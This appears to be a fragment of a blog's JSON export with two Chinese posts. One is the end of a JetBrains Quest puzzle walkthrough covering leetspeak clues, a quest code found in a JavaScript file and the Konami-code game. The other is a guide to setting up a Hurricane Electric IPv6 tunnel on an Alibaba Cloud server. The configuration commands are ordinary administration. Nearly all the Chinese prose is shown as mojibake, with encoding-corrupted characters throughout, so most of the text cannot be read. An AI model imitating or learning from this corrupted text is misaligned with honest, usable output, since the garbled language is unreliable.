questã€‚ ç¬¬ä¸ƒå±Š Hackathonã€‚ï¼ˆemmm &lt;span class=\"react-js-quick-share\" data-hashtag=\"JetBrainsQuest\" data-text=\"I have found the JetBrains Quest! Sometimes you just need to look closely at the Haskell language, Hello,World! in the hackathon lego brainstorms project https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/\" data-theme=\"dark\"&gt; Step 5è®¿é—® https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/ é‡ç‚¹å…³æ³¨ Haskell languageï¼ŒHello,World!ï¼Œhackathon lego brainstorms projectã€‚ çœ‹æ¥å°±ä¸è¿™å¼ å›¾æœ‰å…³äº†å‘¢ï¼ çœ‹æ¥å°±æ˜¯å³è¾¹å›¾ä¸Šè¿™æ®µè¯äº†ã€‚emmm d1D joo KN0w J378r41n2 12 4lw4y2 H1R1Ng? ch3ck Ou7 t3h K4r33r2 P4g3 4nD 533 1f 7H3r3 12 4 J08 0R 4 KW35T 0 cH4Ll3n93 70 g0 fUr7h3r @ 13457. è‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œæˆ‘å¤§æ¦‚ç¿»è¯‘å‡ºæ¥äº†ï¼ Did you know jetbrains is always hiring? Check Out the kareers Page and see if here is a job or a kwest challenge to go further at least å½¢è±¡å¸¦å¸ˆ 233333 ï¼ˆè®²çœŸï¼Œè§‰å¾— CTF æœ‰è¶£çš„ä¸€ä¸ªåŸå› å¤§æ¦‚å°±æ˜¯ä»å„ç§å¥‡æ€ªçš„æ•°å­—å¤§å°å†™å­—æ¯æ··æ‚çš„å½¢è±¡çš„ flag å¼€å§‹çš„å§ ï¼ˆè§‰å¾—å‡ºé¢˜äººè„‘æ´å°±å¾ˆå¤§ æ¯”å¦‚éšæ‰‹æ¥ä¸€ä¸ª â†’ flag{1t_I5_s0_Fun_70_S33_y0u_H3r3}ã€‚ğŸ˜ ä¸è¿‡è¿™é‡Œç¬¬ä¸€æ¬¡è§æŠŠ2å½“ä½œsçš„ã€‚ è¿˜æœ‰kareersåº”è¯¥æ˜¯careersï¼Œkweståº”è¯¥æ˜¯questå§ 23333. æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°åŸæ¥è¿™ä¸ªå«åš Leetï¼Œåˆå« é»‘å®¢è¯­ã€‚ è¯¦è§ VV 1 |&lt; 1 P 3 [) 1 4 ï¼Œclick here. æ‰€ä»¥ JB é¡ºä¾¿å†æ¥æ‹›ä¸ªè˜ï¼Ÿ çœ‹æ¥ä¸‹ä¸€ä¸ª Step æ˜¯ä¸ªä¸ job æœ‰å…³çš„åœ°æ–¹äº†ã€‚ Step 6åœ¨å®˜ç½‘ä¸Šæ‰¾åˆ°äº† Company -&gt; Careers -&gt; Jobs. https://www.jetbrains.com/careers/jobs/ æœç´¢Questï¼Œå‘ç°äº†ä¸€ä¸ªå¥‡æ€ªçš„èŒä½ã€‚é‚£å°±æ˜¯å®ƒäº†ï¼ äºæ˜¯æ¥åˆ°äº†è¿™ä¸ªé¡µé¢ â†“ã€‚ 233333 è¿™é‡Œå›é¡¾äº†ä¸€ä¸‹è¿™ä¸€è·¯ journey ç»å†è¿‡çš„é‚£äº›æœ‰æ„æ€çš„ä¸œè¥¿ã€‚ åˆ°ä¸‹é¢è¿™é‡Œï¼Œç‚¹å‡»æŒ‰é’®ï¼Œä¼šç»™å®ƒçš„é‚®ç®±å‘ä¸ªé‚®ä»¶ã€‚ ï¼ˆmailto:jobs@jetbrains.com?subject=Fearless Quester - Any - any ç„¶è€Œå‘ç°å¹¶ä¸æ˜¯å•¦ 23333. ç„¶åå†çœ‹å› To progress with your quest what youâ€™ll needã€‚ åº”è¯¥æ˜¯ä¸ä¸€ä¸ªæ¸¸æˆå¼€å‘æœ‰å…³ï¼ŒæŸ¥äº†ä¸€ä¸‹ Konami games. æ—¥æœ¬æœ€å…·å½±å“åŠ›çš„æ¸¸æˆè½¯ä»¶å•†ä¹‹ä¸€ï¼ŒKONAMIï¼ˆç§‘ä¹ç¾ï¼‰ã€‚ å¯èƒ½æ˜¯æœ‰ä¸ªæ¸¸æˆå•¥çš„ï¼Ÿ Step 7æ‰¾äº†æ‰¾ game developï¼Œå‘ç°äº†ä¸€ä¸ªè¿™ä¸ªç½‘é¡µã€‚ ç„¶åæ‰¾æ­»æ‰¾ä¸åˆ°questï¼Œéš¾å—æ­»äº†ã€‚ åœ¨ Network é‡Œæ‰¾ä¸ªåŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°å˜¤å˜¤å˜¤ã€‚ å°±åœ¨ä¸€è„¸æ‡µé€¼çš„æ—¶å€™ï¼Œæƒ³èµ·æ¥å¥½åƒæ²¡æœ‰ç”¨ Chrome çš„æ— ç—•æ¨¡å¼ï¼ˆï¼ˆ åæ¥å‘ç°æ˜¯æˆ‘çš„æµè§ˆå™¨å¼€äº†å¼¹çª—æ‹¦æˆªï¼ŒæŠŠæ‰¾ä¸ªä¹Ÿç»™è¯¯æ‹¦æˆªäº†emmmã€‚ å†ä¸€æœï¼Œå‘ç°äº†ç›¸å…³çš„ js æ–‡ä»¶ã€‚ Beat The Queståœ¨block-breaker.js è¿™ä¸ªæ–‡ä»¶é‡Œæœç´¢questï¼Œå‘ç°äº†ç¬¬äºŒä¸ª quest çš„ code â†“ã€‚ ï¼ˆå¯èƒ½è¿™ä¸ªä¹Ÿæ˜¯éé¢„æœŸè§£äº†23333 \"\\n |\\n |\\n | Congratulations you have beat the second quest.\\n | Use the code key GamesAreFun on the\\n | quest page https://jb.gg/quest to claim your prize.\\n | \\n \" æ‰€ä»¥ Code å°±æ˜¯ GamesAreFun å•¦~ æ‹¿ç€å®ƒå» https://jb.gg/quest æ¢æ–°çš„æˆæƒå§å˜»å˜»å˜»ã€‚ å‘ç°ä¹Ÿæ˜¯è·³è½¬åˆ°ä¹‹å‰çš„é‚£ä¸ªé¡µé¢ï¼ˆ https://www.jetbrains.com/promo/quest/ ï¼‰ã€‚ åŒæ ·è¾“å…¥é‚®ç®±å’Œ Code å°±å¥½äº†ã€‚ åˆå¾—åˆ°3ä¸ªæœˆçš„å…è´¹æˆæƒï¼ä¸Šé¢è¯´äº†å¯ä»¥å åŠ ä½¿ç”¨ã€‚ You have passed the second quest and have proven yourself a worthy contender for our devious puzzles. We have one last quest in this series for you. It will be the ultimate quest, and it will secure your place in the halls of JetBrains Quest legend. A little @jetbrains bird will deliver the next clue â€“ so do some birdwatching, å™«ï¼è¿˜æœ‰ä¸€ä¸ªç»ˆæçš„ quest ç­‰ç€å¤§å®¶å‘¢ï¼ çŒœä¸€çŒœæ˜¯ä¸æ˜¯å…­ä¸ªæœˆçš„æˆæƒï¼Œç„¶åå‡‘æˆä¸€æ•´å¹´å‘¢å“ˆå“ˆå“ˆå“ˆå“ˆã€‚ ç„¶ååœ¨é‚®ä»¶ç»“å°¾åˆå‘ç°äº† Leetï¼Œå°±æ˜¯ Step5 ä¸­æåˆ°çš„é‚£ä¸ªé»‘å®¢è¯­ã€‚è¿™æ‰å‘ç°åŸæ¥ Quest1 çš„é‚®ä»¶ä¸­ä¹Ÿæœ‰ã€‚ å¯èƒ½è¿™ä¹Ÿç®—æ˜¯ä¸€ä¸ªæš—ç¤º/hint å§ï¼ Y0U H4V3 R3C13V3D 7H15 3M41L B3C4U53 Y0U H4V3 P4RT1C1P4T3D 1N J3TBR41N5 QU35T è¿™é‡Œè¿˜å¯ä»¥å–æ¶ˆé‚®ä»¶è®¢é˜…å•¥çš„ï¼Œåº”è¯¥è¿˜ç®—æŒºå‹å¥½çš„å§ã€‚ Step7 ä¸­ game dev é¡µé¢çš„æ¸¸æˆè§£æ³•å†å›å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ¸¸æˆåˆ°åº•å•¥å›äº‹ã€‚ç»“åˆå†ä¸Šä¸€æ­¥ä¸­çš„æç¤ºã€‚ To progress with your quest what youâ€™ll need: To check out what we have for game developers. Be geeky enough to remember how you used to cheat at Konami games. Try cheating on the page. çœ‹äº†ä¸€ä¸‹åˆ«äººçš„è®¨è®ºï¼Œæ‰å¤§æ¦‚æ˜ç™½è¿™ä¸ªçš„æ„æ€ã€‚ ä»–æ˜¯æƒ³è®©ä½ ç”¨åœ¨ Konami games é‡Œç§¯ç´¯çš„æŠ€å·§æ¥å”¤å‡ºæ¸¸æˆç•Œé¢ï¼Œç„¶åå°è¯•å®Œæˆæ¸¸æˆï¼Œæˆ–è€…å°è¯•åœ¨ç½‘é¡µä¸­ä½œå¼Šå®Œæˆï¼ˆå¯èƒ½æ˜¯ä¸Šé¢çš„éé¢„æœŸè§£å§ï¼‰ã€‚ æ ¹æ®åˆ«äººçš„è¯´æ³•ï¼Œåœ¨ç½‘é¡µé‡Œé€šè¿‡ä¾æ¬¡æŒ‰ä¸‹é”®ç›˜ä¸Šçš„ ä¸Šä¸Šä¸‹ä¸‹å·¦å³å·¦å³BA è¿™å‡ ä¸ªé”®ï¼Œå°±èƒ½å”¤å‡ºæ¸¸æˆç•Œé¢äº†ï¼ åŸæ¥å°±æ˜¯ä¸ªå¼¹çƒæ¸¸æˆå•Š 23333. è€Œä¸”çƒæ‰äº†è¿˜å¯ä»¥ç»§ç»­ç©ã€‚ çœ‹äº†ä¸€ä¸‹æ˜¯é€šè¿‡ä¸€ä¸ª canvas æ¥å®ç°çš„ã€‚ æŠŠæ¡å—æ¶ˆé™¤å¾—å·®ä¸å¤šå°±çœ‹åˆ° code key å•¦ï¼ å°ç»“æ„Ÿè§‰ JetBrains çš„è¿™ä¸¤ä¸ª Quest éš¾åº¦è¿˜å¥½ï¼Œè¿˜æ˜¯æŒºå‹å¥½çš„ã€‚ äºæ˜¯å°±ç™½å«–äº†æ€»å…±å…­ä¸ªæœˆçš„ JB å…¨å®¶äº§å“å…è´¹æˆæƒã€‚ ï¼ˆä¸è¿‡ä¹‹å‰å°±æœ‰æ•™è‚²é‚®ç®±çš„å…è´¹æˆæƒå‘¢ æ‰€ä»¥é€šè¿‡è¿™ä¸ª Questï¼Œè®©æˆ‘ä»¬æ›´æ·±å…¥åœ°äº†è§£äº† JBï¼Ÿè¯´ä¸å®šè¿˜èƒ½é¡ºä¾¿æ‹›è˜ï¼Ÿ ï¼ˆè¿™å¤§æ¦‚æ˜¯å…¶æœ¬æ„å§ï¼Ÿï¼ˆç›²çŒœ æ³¨æ„ä¸€ä¸‹ä¸Šé¢çš„å†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œè½¬è½½çš„è¯è®°å¾—ç•™ä¸‹æœ¬æ–‡é“¾æ¥å‘¢ã€‚ æ¬¢è¿ä¸€èµ·äº¤æµå˜»å˜»å˜»ã€‚ ï¼ˆæºœäº†æºœäº†","path":"2020/03/12/CTF_2020JetBrainsQuest/"},{"title":"åˆ©ç”¨TunnelBrokerç»™é˜¿é‡Œäº‘ECSé…ç½®å…¬ç½‘IPv6","text":"0x00 å‰è¨€ç›®å‰ IPv6 ç”¨å¾—æŒºå¹¿äº†å§ï¼Œå¾ˆå¤šåº”ç”¨éƒ½æ”¯æŒ IPv6 äº†ï¼Œä¸‰å¤§è¿è¥å•†åŸºæœ¬éƒ½æ”¯æŒäº†ï¼Œè”é€šçš„æµé‡è‡ªå¸¦ IPv6ï¼Œè€Œä¸”å¼€çƒ­ç‚¹çš„è¯è¿˜æ”¯æŒä¸‹å‘ç»™å…¶ä»–è®¾å¤‡ã€‚ ä¸è¿‡å…¶å®å¾ˆå¤šæœåŠ¡å™¨éƒ½æ²¡ä¸Š IPv6ï¼Œæ¯”å¦‚é˜¿é‡Œäº‘çš„ ECS ä¸€èˆ¬å…¬ç½‘åªæœ‰ IPv4 åœ°å€ï¼ˆæƒ³æ‹¥æœ‰ä¸€ä¸ª IPv6 åœ°å€è¿˜å¾—å†èŠ±é’±ï¼‰ã€‚ äºæ˜¯æœ€è¿‘å°±æŠ˜è…¾äº†ä¸€ä¸‹ï¼Œåˆ©ç”¨ Hurricane Electric æä¾›çš„å…è´¹ IPv6 Tunnel Brokerï¼Œè®©é˜¿é‡Œäº‘çš„ ECS æ‹¥æœ‰äº† IPv6 åœ°å€ï¼ˆéåŸç”Ÿï¼‰ï¼Œç†è®ºä¸Šå¤§éƒ¨åˆ†æœåŠ¡å™¨éƒ½é€‚ç”¨çš„ã€‚ è¿™é‡Œç”¨åˆ°çš„æ˜¯ IPv6 Tunnelï¼ŒåŸºäº protocol-41 (6in4)ï¼Œå…¶å®æ˜¯æŠŠ IPv6 åŒ…é€šè¿‡ IPv4 åŒ…æ¥ä¼ è¾“ï¼Œç›¸å½“äºå»ºç«‹åœ¨ç½‘ç»œå±‚ä¸Šçš„ä»£ç†ï¼Œéœ€è¦ä½ çš„æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè€Œä¸”è¦æœ‰ä¸€ä¸ªç›¸å¯¹å›ºå®šçš„å…¬ç½‘ IPv4 åœ°å€ã€‚ When using 6to4, you do not transmit IPv6 packets. Instead, special IPv4 packets are wrapped around IPv6 payloads. These packets have IPv4 protocol 41, as defined by RFC 2473. å½“ç„¶ï¼Œæ€§èƒ½çš„è¯è‚¯å®šæ¯”ä¸ä¸ŠåŸç”Ÿçš„ IPv6 äº†ï¼Œä¸è¿‡è‡ªå·±ç©ç©è¿˜å¥½ï¼Œé—®é¢˜ä¸å¤§å§ã€‚ 0x01 ç”³è¯· IPv6 Tunnel Brokerå‰å¾€ https://tunnelbroker.netï¼Œæ³¨å†Œä¸€ä¸ªä½ è‡ªå·±çš„è´¦å·ã€‚ ç™»å½•ä¹‹åï¼Œç‚¹å‡»å·¦ä¾§çš„ Create Regular Tunnelã€‚ ä¸€ä¸ªè´¦å·æœ€å¤šå¯ä»¥åˆ›å»º5æ¡tunnelã€‚ IPv4 Endpoint é‡Œå¡«æœåŠ¡å™¨çš„å…¬ç½‘åœ°å€ï¼Œè¾“å…¥åä¼šè‡ªåŠ¨æ£€æŸ¥æ˜¯å¦æ”¯æŒã€‚ You are viewing from æ˜¾ç¤ºçš„æ˜¯ä½ è®¿é—®ç½‘ç«™çš„å…¬ç½‘ IPv4 åœ°å€ï¼Œå¦‚æœæ˜¯åœ¨æœåŠ¡å™¨ä¸Šè®¿é—®çš„è¯ Endpoint å°±æ˜¯è¿™ä¸ªäº†ã€‚ æ³¨æ„ï¼šæœåŠ¡å™¨è¦å…è®¸æ¥è‡ª HE çš„ ICMP è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç¦æ­¢æ¥è‡ª HE çš„ pingã€‚ ï¼ˆè¿™é‡Œå€Ÿä¸€å¼ ç½‘ä¸Šçš„å›¾ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·çš„â†“ Available Tunnel Servers é‡Œé€‰æ‹©ç¦»ä½ æœåŠ¡å™¨è¾ƒè¿‘çš„ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Špingè¯•ä¸€è¯•ã€‚ ç°åœ¨æ˜¾ç¤º Los Angeles, CA, US Not Available (Full)ï¼Œæ´›æ‰çŸ¶çš„éƒ½æ»¡äº†233. Asia æœ‰ HKã€SGã€JP è¿™ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œä¸è¿‡æ®ç½‘ä¸Šè¯´è²Œä¼¼é€Ÿåº¦ä¹Ÿä¸æ€ä¹ˆæ ·äº†ï¼Œå…·ä½“è‡ªå·±çœ‹çœ‹å§ã€‚ é€‰æ‹©å¥½ä¹‹åå°±ç‚¹å‡»åˆ›å»ºéš§é“å°±ç”³è¯·å¥½äº†ã€‚ è¿™é‡Œçš„ Client IPv4 Address æ˜¯ä½ ä¹‹å‰å¡«çš„åœ°å€ï¼Œç‚¹å‡»å¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œ Client IPv6 Address å°±æ˜¯ä½ æœåŠ¡å™¨çš„å…¬ç½‘IPv6åœ°å€äº†ï¼Œå¦‚æœéœ€è¦DNSè§£æçš„è¯å°±ç»™è¿™ä¸ªåœ°å€åŠ ä¸ª AAAA è§£æå°±è¡Œï¼ˆæ³¨æ„ä¸éœ€è¦åŠ ä¸Š/64ï¼‰ã€‚ è¿™é‡Œçš„ Routed IPv6 Prefixes æ˜¯è¯¥éš§é“å¯ç”¨äºåˆ†é…çš„ IPv6 åœ°å€æ®µï¼Œå¯ä¸ºå†…ç½‘æœºå™¨éƒ½åˆ†é…ä¸Šå”¯ä¸€çš„ IPv6 åœ°å€ã€‚ å¯è§åˆ†é…çš„æ˜¯ /64ï¼Œå³ IPv6 åœ°å€çš„å‰ç¼€é•¿åº¦ä¸º64ä½ã€‚åï¼ˆ128-64=ï¼‰64ä½ä¸ºç½‘ç»œæ¥å£IDï¼ˆå¯ç†è§£ä¸ºè®¾å¤‡åœ¨ç½‘ç»œä¸Šçš„å”¯ä¸€IDï¼‰ï¼Œå› æ­¤ä½ æœ‰2^64ï¼ˆ1844äº¿äº¿ï¼‰ä¸ªå¯ç”¨çš„IPåœ°å€äº†ã€‚ğŸ˜‰ å½“ç„¶ä½ è¿˜å¯ä»¥ç”³è¯·ä¸€ä¸ª/48å‰ç¼€çš„è·¯ç”±ï¼Œè¿™æ ·å¯ç”¨çš„åœ°å€æ›´å¤šäº†ã€‚ï¼ˆ2^80ä¸ªï¼‰ 0x02 é˜¿é‡Œäº‘ ECS å¼€å¯ IPv6é˜¿é‡Œäº‘çš„ç¡¬ç›˜é•œåƒé»˜è®¤æ˜¯æŠŠ IPv6 ç»™å…³æ‰çš„ï¼Œè¿™é‡Œå°±æ‰‹åŠ¨æ‰“å¼€å¥½äº†ã€‚ vim /etc/sysctl.conf åœ¨æ–‡ä»¶æœ«å°¾çš„ä½ç½®æŠŠipv6è®¾ç½®ä¸­çš„1æ”¹æˆ0ï¼Œå˜æˆç±»ä¼¼å¦‚ä¸‹çš„äºšå­ã€‚ net.ipv6.conf.all.disable_ipv6 = 0 net.ipv6.conf.default.disable_ipv6 = 0 net.ipv6.conf.lo.disable_ipv6 = 0 net.ipv6.conf.eth0.disable_ipv6 = 0 è€Œåé‡æ–°è½½å…¥é…ç½®ã€‚ sysctl -p ç„¶åä½¿ç”¨ifconfigçœ‹ä¸€çœ‹ï¼Œå°±ä¼šå‘ç°æ”¯æŒ IPv6 äº†ã€‚ æ¯”å¦‚ä¸‹é¢è¿™ä¸ªï¼Œæœ‰äº†inet6è¿™ä¸€é¡¹ã€‚ eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.xxx.xxx.xxx netmask 255.255.240.0 broadcast 172.xxx.xxx.xxx inet6 fe80::xxxx:xxxx:xxxx:xxxx prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:xx:xx:xx:xx txqueuelen 1000 (ä»¥å¤ªç½‘) RX packets 1688753 bytes 328028654 (328.0 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1837158 bytes 637871915 (637.8 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 0x03 ç»™ ECS é…ç½® IPv6 éš§é“åœ¨Example Configuration é‡Œæœ‰å¾ˆå¤šç¤ºä¾‹ã€‚ æ¯”å¦‚Ubuntuçš„ã€‚ vim /etc/network/interfaces auto he-ipv6 iface he-ipv6 inet6 v4tunnel address 2001:470:xxxx:xxxx::2 netmask 64 endpoint 216.218.xxx.xxx local 172.16.xxx.xxx ttl 255 gateway 2001:470:xxxx:xxxx::1 å°†ä¸Šé¢çš„é…ç½®ç²˜è´´åˆ°æ–‡ä»¶çš„æœ€åã€‚ æ³¨æ„ä¸€ä¸‹ï¼Œå†…ç½‘ç¯å¢ƒè¦ç”¨å†…ç½‘çš„IPï¼ä»–è¿™é‡Œä¹Ÿå†™æ¸…æ¥šäº†çš„ã€‚ NOTE: When behind a firewall appliance that passes protocol 41, use the IPv4 address you get from your applianceâ€™s DHCP service instead of the IPv4 endpoint you provided to our broker. æ³¨æ„ï¼š é˜¿é‡Œäº‘çš„ ECS è¦å°†localä¸­çš„IPä¿®æ”¹ä¸ºå†…ç½‘çš„IPï¼Œå³ç§ç½‘IPåœ°å€ï¼Œä¾‹å¦‚172.16.xxx.xxxï¼Œè€Œä¸æ˜¯å…¬ç½‘IPï¼ï¼ï¼ ä¸æ¸…æ¥šçš„è¯è¿˜å¯ä»¥å‚è€ƒUbuntuçš„Wikiï¼Œæˆ³è¿™é‡Œã€‚ è€Œåè®©IPv6ç”Ÿæ•ˆã€‚ ifup he-ipv6 å†çœ‹ä¸€ä¸‹ ifconfigï¼Œè¿™æ—¶åº”è¯¥æœ‰ä¸€ä¸ª he-ipv6çš„äº†ï¼ç±»ä¼¼è¿™æ ·çš„ã€‚ he-ipv6: flags=209&lt;UP,POINTOPOINT,RUNNING,NOARP&gt; mtu 1480 inet6 2001:470:xxxx:xxxx::2 prefixlen 64 scopeid 0x0&lt;global&gt; inet6 fe80::xxxx:xxxx prefixlen 64 scopeid 0x20&lt;link&gt; sit txqueuelen 1000 (IPv6-in-IPv4) RX packets 11605 bytes 3127821 (3.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 13811 bytes 2403522 (2.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 P.S.: å¦‚æœæƒ³è®©éš§é“å¤±æ•ˆï¼ˆæ²¡æœ‰åˆ é™¤çš„è¯é‡å¯åè¿˜æ˜¯ä¼šè‡ªåŠ¨å¯ç”¨ï¼‰ï¼š ifdown he-ipv6 å¦‚æœæƒ³åˆ é™¤éš§é“ï¼š ip tunnel del he-ipv6 å¦‚æœå·²ç»ç”Ÿæ•ˆäº†ä¼šæç¤ºï¼šifup: interface he-ipv6 already configuredã€‚ å¦‚æœè®¾ç½®å‡ºé”™äº†ï¼Œæˆ–è€…æƒ³ä¿®æ”¹é…ç½®ï¼Œéœ€è¦å…ˆåˆ é™¤éš§é“ï¼Œå†é‡æ–°ç”Ÿæ•ˆå°±å¥½ã€‚ ç°åœ¨å°±æ¥æµ‹è¯•ä¸€ä¸‹å§ï¼ root@miaoTony:~# ping6 -c 5 ipv6.google.com PING ipv6.google.com(tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e)) 56 data bytes 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=1 ttl=53 time=393 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=2 ttl=53 time=390 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=3 ttl=53 time=390 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=4 ttl=53 time=393 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=5 ttl=53 time=388 ms --- ipv6.google.com ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 4003ms rtt min/avg/max/mdev = 388.107/391.132/393.213/1.914 ms å½“ç„¶ä¹Ÿå¯ä»¥ ping6 ipv6.baidu.comã€‚ å¦‚æœä¸æˆåŠŸå¯ä»¥é‡å¯ç³»ç»Ÿè¯•è¯•ã€‚ å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å°è¯•åœ¨å‘½ä»¤è¡Œä¸­è¿›è¡Œé…ç½®ï¼ˆç•¥ï¼‰ã€‚ Windows 10 ä¸‹çš„é…ç½®ï¼Œåœ¨ cmd ä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚ netsh interface teredo set state disabled netsh interface ipv6 add v6v4tunnel interface=IP6Tunnel localaddress=172.16.xxx.xxx remoteaddress=216.218.xxx.xxx netsh interface ipv6 add address interface=IP6Tunnel address=2001:470:xx:xxxx::2 netsh interface ipv6 add route prefix=::/0 interface=IP6Tunnel nexthop=2001:470:xx:xxxx::1 æ³¨æ„ä¿®æ”¹å¯¹åº”çš„IPåœ°å€ã€‚ 0x04 ä¸€äº›é—®é¢˜çš„è§£å†³æŒ‰ç…§ä¸Šé¢ä¸€ç•ªé…ç½®å¥½ä¹‹åï¼Œæœ‰å¯èƒ½è¿˜æ˜¯è®¿é—®ä¸äº† IPv6 çš„ç½‘ç«™ã€‚ æœ‰å¯èƒ½éœ€è¦å¦‚ä¸‹å¤„ç†å§ã€‚ï¼ˆè°çŸ¥é“ä¼šè¿™ä¹ˆéº»çƒ¦å‘¢ è¦æ˜¯æ²¡äº‹äº†å°±ç›´æ¥å¾€ä¸‹çœ‹äº†ã€‚ éœ€è¦æ”¾è¡ŒæœåŠ¡å™¨çš„41ç«¯å£ã€‚æ¯•ç«Ÿæµé‡æ˜¯é€šè¿‡IPv4ä¼ è¾“çš„å•¦ã€‚ ä¾‹å¦‚ï¼š ufw allow 41 æˆ–è€… iptables -t filter -I INPUT -p 41 -j ACCEPT iptables -t filter -I OUTPUT -p 41 -j ACCEPT åŒæ—¶è¦è®°å¾—åœ¨ï¼ˆé˜¿é‡Œäº‘çš„ï¼‰å®‰å…¨ç»„é‡Œæ”¾è¡Œã€‚ é…ç½®å¥½ IPv6 çš„ DNS vim /etc/resolv.conf åœ¨æœ€åæ·»åŠ è°·æ­Œçš„DNSæœåŠ¡å™¨ nameserver 2001:4860:4860::8888 nameserver 2001:4860:4860::8844 æˆ–è€…å›½å†…çš„å…¬å…±DNSï¼š240c::6666 æˆ– 240c::6644 æ·»åŠ è·¯ç”± route -A inet6 add ::/0 dev he-ipv6 å† ping ä¸€ä¸‹åº”è¯¥å¯ä»¥äº†å§ï¼ˆ ä¸è¡Œå†é‡å¯è¯•è¯•ï¼ˆé‡å¯è§£å†³ç»å¤§éƒ¨åˆ†é—®é¢˜å‘¢ 0x05 Nginx æ”¯æŒ IPv6 è®¿é—®ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç›‘å¬ IPv6 ç«¯å£ã€‚ server { listen 80; listen [::]:80; // ç›‘å¬ IPv6 çš„ 80 ç«¯å£ # ... } server { listen 443 ssl http2; listen [::]:443 ssl http2; // ç›‘å¬ IPv6 çš„ 443 ç«¯å£ # ... } ç„¶è€Œï¼Œå‘ç°ä¸€ä¸ªæƒ…å†µï¼Œåªæœ‰å½“æœåŠ¡å™¨è®¿é—®IPv6çš„ç½‘ç«™çš„æ—¶å€™ï¼Œæˆ–è€…è¯´æœ‰ IPv6 æµé‡çš„æ—¶å€™ï¼Œå¤–ç½‘æ‰èƒ½é€šè¿‡è¿™ä¸ªå…¬ç½‘çš„IPv6åœ°å€è®¿é—®åˆ°æœåŠ¡å™¨emmmã€‚ï¼ˆæ‡µ äºæ˜¯åŠ ä¸€ä¸ª cron è®¡åˆ’ï¼Œå®šæ—¶pingä¸€ä¸‹å¥½äº†ã€‚ crontab -e æ·»åŠ ä¸€ä¸ªè®¡åˆ’ã€‚ */1 * * * * ping6 -c 1 he.net é‡å¯ cron ä½¿å…¶ç”Ÿæ•ˆã€‚ systemctl restart cron æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ ping æ“ä½œï¼Œè¿™æ ·è®¿é—®å°±æ²¡é—®é¢˜äº†ã€‚ ï¼ˆä¸è¿‡æƒ³ä¸å¤§æ˜ç™½ä¸ºå•¥è¿™ä¸ªé€šé“ä¼šè‡ªåŠ¨æ–­å¼€ã€‚æœ‰äººè¯´ä¸ ip6tables æœ‰å…³ï¼Œä¸å¤§æ¸…æ¥šã€‚ã€‚ emmm 0x06 é…ç½® DNSé…ç½®ä¸€æ¡AAAAè®°å½•æŒ‡å‘å…¬ç½‘çš„ IPv6 åœ°å€å³å¯ã€‚å¯ä»¥è¯•è¯•å¼€å¯CDNã€‚ è€Œåå°±å¯ä»¥é€šè¿‡åŸŸåè®¿é—®ç½‘ç«™äº†ã€‚ ä¸è¿‡æ²¡æœ‰ CDN çš„è¯åªèƒ½é€šè¿‡ IPv6 è¿›è¡Œè®¿é—®ã€‚ 0x07 æ£€æŸ¥ç½‘ç«™æ˜¯å¦æ”¯æŒ IPv6åˆ©ç”¨ http://ipv6-test.com/validate.php 0x08 è‡ªåŠ¨æ›´æ–° Endpoint IPå‰é¢è¯´åªè¦å…¬ç½‘çš„IPv4åœ°å€ç›¸å¯¹å›ºå®šå°±å¥½äº†ï¼Œè¿™é‡Œå°±è¿™ä¸ªæ„æ€å•¦ã€‚ HE è¿˜æ”¯æŒä¸ºåŠ¨æ€ IPv4 åœ°å€å»ºç«‹ IPv6 é€šé“ï¼Œè¿™é‡Œè¦ç”¨åˆ°ä»–æä¾›çš„APIäº†ã€‚ Weâ€™ve added support for Dyn-compliant endpoint updates so that equipment talking this spec can very easily update your tunnel endpoint. Update URL: https://ipv4.tunnelbroker.net/nic/update (ipv4 is important here, donâ€™t remove it)Username: Your Tunnelbroker.net usernamePassword: Tunnel specific authentication key (under Advanced on the tunnel information page) if one is set, otherwise your Tunnelbroker.net password.Hostname: Numeric tunnel ID Numeric tunnel ID in â€œtunnel#.tunnelbroker.netâ€ (This host does not actually exist) Tunnel reverse host, aka â€œuser-#.tunnel.tserv#.loc#.ipv6.he.netâ€ æˆ–è€…ä¹Ÿå¯ä»¥è®¿é—®æ›´æ–°çš„URLã€‚ å°±å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šå†™ä¸ªè„šæœ¬æ£€æŸ¥å…¬ç½‘åœ°å€æœ‰æ²¡æœ‰æ›´æ–°å°±å¥½äº†ã€‚ è‡ªåŠ¨æ›´æ–°IPv4åœ°å€ï¼š To auto-detect your IPv4 address: https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt; 